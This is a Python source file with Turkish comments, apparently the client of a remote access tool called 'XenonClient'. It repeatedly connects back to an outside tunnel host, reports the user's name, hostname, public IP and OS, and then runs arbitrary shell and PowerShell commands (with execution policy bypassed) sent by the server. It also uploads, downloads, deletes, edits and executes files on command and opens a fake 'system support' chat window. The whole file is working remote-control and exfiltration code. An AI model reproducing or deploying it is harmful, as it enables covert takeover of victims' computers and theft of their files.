import socket
import threading
import subprocess
import os
import platform
import json
import webbrowser
import time
import tkinter as tk
from tkinter import messagebox, scrolledtext
import base64
import tempfile
import urllib.request

# --- BAĞLANTI AYARLARI (KENDİ AĞINA GÖRE DÜZENLE) ---
HOST = "uwtd3ffva.localto.net"   # Server IP (kendi bilgisayarında çalışıyorsa 127.0.0.1)
PORT = 7839
# -----------------------------------------------------

class XenonClient:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sock = None
        self.chat_win = None
        self.chat_box = None
        self.chat_running = False

    # ---------- JSON + UZUNLUK PROTOKOLÜ ----------
    def send_json(self, data):
        msg = json.dumps(data).encode('utf-8')
        length = len(msg).to_bytes(4, byteorder='big')
        self.sock.send(length + msg)

    def recv_json(self):
        raw_len = self.sock.recv(4)
        if not raw_len:
            return None
        msg_len = int.from_bytes(raw_len, byteorder='big')
        chunks = []
        while msg_len > 0:
            chunk = self.sock.recv(min(4096, msg_len))
            if not chunk:
                break
            chunks.append(chunk)
            msg_len -= len(chunk)
        return json.loads(b''.join(chunks).decode('utf-8'))

    # ---------- SİSTEM BİLGİSİ ----------
    def get_sys_info(self):
        try:
            with urllib.request.urlopen('https://api.ipify.org', timeout=5) as resp:
                public_ip = resp.read().decode('utf-8')
        except:
            public_ip = "Unknown"
        try:
            with urllib.request.urlopen('https://ipapi.co/country/', timeout=5) as resp:
                country = resp.read().decode('utf-8').strip()
        except:
            country = "TR"
        return {
            "id": f"{os.getlogin()}@{platform.node()}",
            "ip": public_ip,
            "country": country,
            "os": f"{platform.system()} {platform.release()}"
        }

    # ---------- BAĞLANTI ----------
    def connect(self):
        while True:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect((self.host, self.port))
                self.send_json({"cmd": "init", "info": self.get_sys_info()})
                self.listen()
            except Exception as e:
                print(f"Bağlantı hatası: {e}, 5 saniye sonra yeniden deneniyor...")
                time.sleep(5)

    def listen(self):
        while True:
            try:
                data = self.recv_json()
                if data is None:
                    break
                self.process_message(data)
            except:
                break
        self.sock.close()

    # ---------- KOMUT İŞLEME ----------
    def process_message(self, data):
        cmd = data.get("cmd")
        if not cmd:
            return

        if cmd == "msg":
            threading.Thread(target=lambda: messagebox.showinfo("Duyuru", data["text"])).start()

        elif cmd == "chat_open":
            if not self.chat_running:
                threading.Thread(target=self.gui_chat, daemon=True).start()

        elif cmd == "chat_msg":
            if self.chat_box:
                try:
                    self.chat_box.config(state="normal")
                    self.chat_box.insert(tk.END, f"DESTEK: {data['text']}\n")
                    self.chat_box.config(state="disabled")
                    self.chat_box.see(tk.END)
                except:
                    pass

        elif cmd == "chat_close":
            if self.chat_win:
                self.chat_running = False
                try:
                    self.chat_win.quit()
                except:
                    pass

        elif cmd == "beep":
            if platform.system() == "Windows":
                import winsound
                winsound.Beep(800, 500)

        elif cmd == "open_url":
            webbrowser.open(data["url"])

        elif cmd == "shell":
            self.run_cmd(data["command"], data.get("shell_type", "cmd"))

        elif cmd == "file_list":
            threading.Thread(target=self.handle_file_list, args=(data["path"],), daemon=True).start()

        elif cmd == "file_download":
            threading.Thread(target=self.handle_file_download, args=(data["path"],), daemon=True).start()

        elif cmd == "file_upload":
            threading.Thread(target=self.handle_file_upload, args=(data["path"], data["data"]), daemon=True).start()

        elif cmd == "file_delete":
            threading.Thread(target=self.handle_file_delete, args=(data["path"],), daemon=True).start()

        elif cmd == "file_execute":
            threading.Thread(target=self.handle_file_execute, args=(data["path"],), daemon=True).start()

        elif cmd == "file_edit_get":
            threading.Thread(target=self.handle_file_edit_get, args=(data["path"],), daemon=True).start()

        elif cmd == "file_edit_save":
            threading.Thread(target=self.handle_file_edit_save, args=(data["path"], data["content"]), daemon=True).start()

        elif cmd == "file_mkdir":
            threading.Thread(target=self.handle_file_mkdir, args=(data["path"],), daemon=True).start()

        elif cmd == "file_touch":
            threading.Thread(target=self.handle_file_touch, args=(data["path"],), daemon=True).start()

        elif cmd == "file_rename":
            threading.Thread(target=self.handle_file_rename, args=(data["old"], data["new"]), daemon=True).start()

    # ---------- SHELL ----------
    def run_cmd(self, command, mode):
        def task():
            try:
                final_cmd = command
                if mode == "powershell":
                    final_cmd = f"powershell -ExecutionPolicy Bypass -Command {command}"
                proc = subprocess.Popen(final_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                stdout, stderr = proc.communicate()
                res = (stdout + stderr).decode("cp857", errors="replace")
                if not res.strip():
                    res = "Komut çalıştırıldı (çıktı yok)."
                self.send_json({"cmd": "shell_res", "output": res})
            except Exception as e:
                self.send_json({"cmd": "shell_res", "output": f"Hata: {str(e)}"})
        threading.Thread(target=task, daemon=True).start()

    # ---------- DOSYA İŞLEMLERİ ----------
    def handle_file_list(self, path):
        try:
            items = []
            with os.scandir(path) as entries:
                for entry in entries:
                    is_dir = entry.is_dir()
                    size = entry.stat().st_size if not is_dir else 0
                    modified = entry.stat().st_mtime
                    items.append({
                        "name": entry.name,
                        "is_dir": is_dir,
                        "size": size,
                        "modified": modified
                    })
            self.send_json({"cmd": "file_res", "subcmd": "list", "path": path, "items": items})
        except Exception as e:
            self.send_json({"cmd": "file_res", "subcmd": "list", "path": path, "error": str(e)})

    def handle_file_download(self, path):
        try:
            with open(path, "rb") as f:
                data = f.read()
            encoded = base64.b64encode(data).decode('utf-8')
            self.send_json({"cmd": "file_res", "subcmd": "download", "path": path, "data": encoded})
        except Exception as e:
            self.send_json({"cmd": "file_res", "subcmd": "download", "path": path, "error": str(e)})

    def handle_file_upload(self, path, encoded):
        try:
            data = base64.b64decode(encoded)
            with open(path, "wb") as f:
                f.write(data)
            self.send_json({"cmd": "file_res", "subcmd": "upload", "path": path, "success": True})
        except Exception as e:
            self.send_json({"cmd": "file_res", "subcmd": "upload", "path": path, "error": str(e)})

    def handle_file_delete(self, path):
        try:
            if os.path.isdir(path):
                os.rmdir(path)
            else:
                os.remove(path)
            self.send_json({"cmd": "file_res", "subcmd": "delete", "path": path, "success": True})
        except Exception as e:
            self.send_json({"cmd": "file_res", "subcmd": "delete", "path": path, "error": str(e)})

    def handle_file_execute(self, path):
        try:
            if platform.system() == "Windows":
                os.startfile(path)
            else:
                subprocess.Popen([path])
            self.send_json({"cmd": "file_res", "subcmd": "execute", "path": path, "success": True})
        except Exception as e:
            self.send_json({"cmd": "file_res", "subcmd": "execute", "path": path, "error": str(e)})

    def handle_file_edit_get(self, path):
        try:
            with open(path, "r", encoding="utf-8") as f:
                content = f.read()
            self.send_json({"cmd": "file_res", "subcmd": "edit_get", "path": path, "content": content})
        except Exception as e:
            self.send_json({"cmd": "file_res", "subcmd": "edit_get", "path": path, "error": str(e)})

    def handle_file_edit_save(self, path, content):
        try:
            with open(path, "w", encoding="utf-8") as f:
                f.write(content)
            self.send_json({"cmd": "file_res", "subcmd": "edit_save", "path": path, "success": True})
        except Exception as e:
            self.send_json({"cmd": "file_res", "subcmd": "edit_save", "path": path, "error": str(e)})

    def handle_file_mkdir(self, path):
        try:
            os.makedirs(path, exist_ok=True)
            self.send_json({"cmd": "file_res", "subcmd": "mkdir", "path": path, "success": True})
        except Exception as e:
            self.send_json({"cmd": "file_res", "subcmd": "mkdir", "path": path, "error": str(e)})

    def handle_file_touch(self, path):
        try:
            with open(path, "a"):
                os.utime(path, None)
            self.send_json({"cmd": "file_res", "subcmd": "touch", "path": path, "success": True})
        except Exception as e:
            self.send_json({"cmd": "file_res", "subcmd": "touch", "path": path, "error": str(e)})

    def handle_file_rename(self, old, new):
        try:
            os.rename(old, new)
            self.send_json({"cmd": "file_res", "subcmd": "rename", "path": new, "success": True})
        except Exception as e:
            self.send_json({"cmd": "file_res", "subcmd": "rename", "old": old, "error": str(e)})

    # ---------- SOHBET GUI ----------
    def gui_chat(self):
        self.chat_running = True
        self.chat_win = tk.Tk()
        self.chat_win.title("Sistem Destek")
        self.chat_win.geometry("350x450")
        self.chat_win.attributes("-topmost", True)
        
        self.chat_box = scrolledtext.ScrolledText(self.chat_win, state="disabled")
        self.chat_box.pack(expand=True, fill="both", padx=5, pady=5)
        
        ent = tk.Entry(self.chat_win)
        ent.pack(fill="x", padx=5, pady=5)

        def send_srv(e=None):
            m = ent.get()
            if m:
                self.chat_box.config(state="normal")
                self.chat_box.insert(tk.END, f"Siz: {m}\n")
                self.chat_box.config(state="disabled")
                ent.delete(0, tk.END)
                try:
                    self.send_json({"cmd": "chat", "text": m})
                except:
                    pass
        
        ent.bind("<Return>", send_srv)
        
        def on_closing():
            self.chat_running = False
            self.chat_win.destroy()
            self.chat_win = None
            self.chat_box = None
            
        self.chat_win.protocol("WM_DELETE_WINDOW", on_closing)
        self.chat_win.mainloop()
        self.chat_running = False
        self.chat_win = None


if __name__ == "__main__":
    client = XenonClient(HOST, PORT)
    try:
        client.connect()
    except KeyboardInterrupt:
        pass
